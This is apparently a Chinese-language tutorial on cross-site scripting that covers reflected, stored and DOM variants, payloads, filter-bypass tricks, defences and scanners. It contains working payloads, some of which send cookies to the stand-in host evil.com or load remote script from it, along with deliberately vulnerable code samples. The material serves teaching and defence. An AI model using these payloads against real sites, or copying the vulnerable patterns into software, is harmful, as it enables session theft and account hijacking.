# 跨站脚本攻击 (Cross-Site Scripting, XSS)

## 概述

XSS 是 Web 应用中最常见的安全漏洞之一。攻击者在网页中注入恶意脚本，使其他用户浏览器执行该脚本，从而窃取 Cookie、Session、劫持用户操作或传播恶意内容。

## 漏洞原理

当应用程序将用户输入未经转义地直接输出到 HTML 页面时，攻击者可以注入 JavaScript 代码。

### 易受攻击代码示例

```javascript
// 危险：直接插入用户输入到 innerHTML
document.getElementById("greeting").innerHTML = "Hello, " + userName;
```

```php
// 危险：直接输出未转义内容
echo "搜索结果：" . $_GET["q"];
```

## 三种类型

### 1. 反射型 XSS (Reflected)

恶意脚本包含在请求参数中，服务端将其反射回响应页面。

**攻击向量**：

```
https://target.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**特点**：
- 需要用户点击恶意链接
- 脚本不持久化，每次访问触发一次
- 常见于搜索框、错误页面、跳转链接

### 2. 存储型 XSS (Stored / Persistent)

恶意脚本被存储在服务器端（数据库、文件），所有访问该页面的用户都会执行脚本。

**攻击向量**：
- 论坛帖子、评论、用户资料、私信

```html
<!-- 存储在评论字段 -->
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```

**特点**：
- 影响范围大，所有访问者受害
- 攻击者无需诱导用户点击特定链接
- 危害最严重

### 3. DOM XSS

恶意输入不经过服务端，直接在客户端 DOM 中被不安全地处理。

**攻击向量**：

```javascript
// 危险：直接使用 location.hash
var msg = document.getElementById("msg");
msg.innerHTML = decodeURIComponent(location.hash.slice(1));
```

访问 `https://target.com/#<img src=x onerror=alert(1)>` 触发。

**特点**：
- 服务端完全不参与，传统 WAF 难以检测
- 纯前端漏洞，需要审查 JavaScript 代码

## 常见 Payload

### 基础探测

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

### 绕过技术

**大小写混写**：
```html
<ScRiPt>alert(1)</ScRiPt>
```

**事件处理器**：
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

**编码绕过**：
```html
<!-- HTML 实体编码 -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- URL 编码（DOM XSS）-->
#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

**无脚本标签**：
```html
<img src=x onerror="var s=document.createElement('script');s.src='https://evil.com/xss.js';document.body.appendChild(s)">
```

## 防御方案

### 1. 输出转义（核心防御）

根据输出上下文选择正确的转义方式：

| 输出位置 | 转义方法 |
|---------|---------|
| HTML 正文 | HTML 实体转义：`<` → `&lt;`，`>` → `&gt;` |
| HTML 属性 | 属性转义 + 引号包裹 |
| JavaScript 上下文 | JavaScript 字符串转义（`\xHH`）|
| URL 参数 | URL 编码（`encodeURIComponent`）|
| CSS | CSS 转义（`\HHHHHH`）|

```python
# Python Jinja2 默认自动转义
{{ user_input }}  # 安全
{{ user_input | safe }}  # 危险：禁用转义
```

```javascript
// JavaScript：使用 textContent 而非 innerHTML
element.textContent = userInput;  // 安全
```

### 2. Content Security Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```

限制脚本来源，有效降低 XSS 危害（但不能完全防御）。

### 3. HttpOnly Cookie

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

防止 `document.cookie` 读取敏感 Cookie。

### 4. 输入过滤（辅助手段）

```python
# 白名单过滤
import re
CLEAN_RE = re.compile(r'^[a-zA-Z0-9\s\-_.]+$')
if not CLEAN_RE.match(user_input):
    raise ValueError("Invalid input")
```

## 检测工具

| 工具 | 类型 | 说明 |
|------|------|------|
| DalFox | 开源扫描器 | 专注 XSS，支持 DOM/反射/存储型 |
| XSStrike | 开源扫描器 | 智能 payload 生成 |
| Burp Suite Pro | 商业工具 | 主动+被动扫描 |
| nuclei | 模板扫描 | 批量检测 |

## 参考

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: Cross-site Scripting
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
